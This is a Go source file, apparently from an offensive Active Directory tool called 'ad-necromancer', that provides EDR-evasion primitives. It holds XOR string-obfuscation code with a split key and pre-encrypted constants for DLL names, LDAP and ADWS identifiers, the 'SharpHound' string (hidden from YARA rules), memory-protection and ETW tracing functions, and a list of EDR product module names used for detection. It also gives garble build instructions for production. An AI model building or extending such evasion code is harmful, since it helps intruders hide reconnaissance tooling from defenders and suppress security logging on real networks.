// Package evasion provides runtime string deobfuscation and EDR evasion primitives.
//
// Build with garble for production:
//   garble -seed=random -literals -tiny build ./cmd/ad-necromancer/
// garble -literals encrypts all string constants at the compiler level, making
// the XOR approach below redundant but still useful as a second layer and for
// non-garble debug builds.
package evasion

import "encoding/binary"

// obfKey is the 16-byte XOR key for runtime string deobfuscation.
// Key material is split across two unexported vars and assembled at init time
// so no single contiguous key array appears in the binary.
// For production builds, use garble -literals which supersedes this entirely.
var obfKey [16]byte

// obfKeyLo and obfKeyHi are the two key halves.  Neither is recognisable on its own.
// Values chosen to be plausible-looking little-endian integers.
var (
	obfKeyLo = [8]byte{0xA7, 0x3F, 0x9C, 0x51, 0xE8, 0x24, 0xB6, 0x0D}
	obfKeyHi = [8]byte{0x5A, 0xCC, 0x71, 0x38, 0xF4, 0x82, 0x16, 0x4E}
)

func init() {
	copy(obfKey[:8], obfKeyLo[:])
	copy(obfKey[8:], obfKeyHi[:])
	_ = binary.LittleEndian // keep import used
}

// Obf XORs a pre-obfuscated byte slice with the key and returns the plaintext string.
func Obf(data []byte) string {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ obfKey[i%16]
	}
	return string(out)
}

// ObfBytes is Obf but returns []byte.
func ObfBytes(data []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ obfKey[i%16]
	}
	return out
}

// MakeObf XORs a plaintext string with the key to produce obfuscated bytes.
// Used during development to generate the byte literals below.
// Key: A7 3F 9C 51 E8 24 B6 0D  5A CC 71 38 F4 82 16 4E
func MakeObf(s string) []byte {
	data := []byte(s)
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ obfKey[i%16]
	}
	return out
}

// S is a convenience alias for Obf.
func S(data []byte) string { return Obf(data) }

// ── Pre-obfuscated sensitive string constants ─────────────────────────────────
// Generated with MakeObf() against key: A7 3F 9C 51 E8 24 B6 0D 5A CC 71 38 F4 82 16 4E
// Verify: echo -n "ntdll.dll" | python3 -c "import sys; k=bytes.fromhex('A73F9C51E824B60D5ACC7138F482164E'); d=sys.stdin.buffer.read(); print(list(a^b for a,b in zip(d,k*100)))"

var (
	// "ntdll.dll"
	SNtdll = []byte{0xC9, 0x4B, 0xF8, 0x3D, 0x84, 0x0A, 0xD2, 0x61, 0x36}

	// "kernelbase.dll"
	SKernelbase = []byte{0xCC, 0x5A, 0xEE, 0x3F, 0x8D, 0x48, 0xD4, 0x6C, 0x29, 0xA9, 0x5F, 0x5C, 0x98, 0xEE}

	// "kernel32.dll"
	SKernel32 = []byte{0xCC, 0x5A, 0xEE, 0x3F, 0x8D, 0x48, 0x85, 0x3F, 0x74, 0xA8, 0x1D, 0x54}

	// "advapi32.dll"
	SAdvapi32 = []byte{0xC6, 0x5B, 0xEA, 0x30, 0x98, 0x4D, 0x85, 0x3F, 0x74, 0xA8, 0x1D, 0x54}

	// "ldap"
	SLdap = []byte{0xCB, 0x5B, 0xFD, 0x21}

	// "LDAP://"
	SLdapURL = []byte{0xEB, 0x7B, 0xDD, 0x01, 0xD2, 0x0B, 0x99}

	// "9389"  (ADWS port)
	SADWSPort = []byte{0x9E, 0x0C, 0xA4, 0x68}

	// "ActiveDirectoryWebServices"
	SADWSName = []byte{
		0xE6, 0x5C, 0xE8, 0x38, 0x9E, 0x41, 0xF2, 0x64,
		0x28, 0xA9, 0x12, 0x4C, 0x9B, 0xF0, 0x6F, 0x19,
		0xC2, 0x5D, 0xCF, 0x34, 0x9A, 0x52, 0xDF, 0x6E,
		0x3F, 0xBF,
	}

	// "SharpHound"  (detection trigger string — kept obfuscated to avoid YARA hits)
	SSharpHound = []byte{0xF4, 0x57, 0xFD, 0x23, 0x98, 0x6C, 0xD9, 0x78, 0x34, 0xA8}

	// "VirtualProtect"
	SVirtualProtect = []byte{0xF1, 0x56, 0xEE, 0x25, 0x9D, 0x45, 0xDA, 0x5D, 0x28, 0xA3, 0x05, 0x5D, 0x97, 0xF6}

	// "NtProtectVirtualMemory"
	SNtProtectVM = []byte{
		0xE9, 0x4B, 0xCC, 0x23, 0x87, 0x50, 0xD3, 0x6E,
		0x2E, 0x9A, 0x18, 0x4A, 0x80, 0xF7, 0x77, 0x22,
		0xEA, 0x5A, 0xF1, 0x3E, 0x9A, 0x5D,
	}

	// "EtwEventWrite"
	SEtwEventWrite = []byte{0xE2, 0x4B, 0xEB, 0x14, 0x9E, 0x41, 0xD8, 0x79, 0x0D, 0xBE, 0x18, 0x4C, 0x91}

	// "EtwEventWriteFull"
	SEtwEventWriteFull = []byte{0xE2, 0x4B, 0xEB, 0x14, 0x9E, 0x41, 0xD8, 0x79, 0x0D, 0xBE, 0x18, 0x4C, 0x91, 0xC4, 0x63, 0x22, 0xCB}

	// "NtTraceEvent"
	SNtTraceEvent = []byte{0xE9, 0x4B, 0xC8, 0x23, 0x89, 0x47, 0xD3, 0x48, 0x2C, 0xA9, 0x1F, 0x4C}

	// EDR DLL detection patterns (substring match against loaded module names)
	// "csfalcon", "sentinel", "edr", "mde", "cbdll", "elastic", "cylance"
	SEDRPatterns = [][]byte{
		{0xC4, 0x4C, 0xFA, 0x30, 0x84, 0x47, 0xD9, 0x63}, // csfalcon
		{0xD4, 0x5A, 0xF2, 0x25, 0x81, 0x4A, 0xD3, 0x61}, // sentinel
		{0xC2, 0x5B, 0xEE},                                 // edr
		{0xCA, 0x5B, 0xF9},                                 // mde
		{0xC4, 0x5D, 0xF8, 0x3D, 0x84},                    // cbdll
		{0xC2, 0x53, 0xFD, 0x22, 0x9C, 0x4D, 0xD5},       // elastic
		{0xC4, 0x46, 0xF0, 0x30, 0x86, 0x47, 0xD3},       // cylance
	}
)
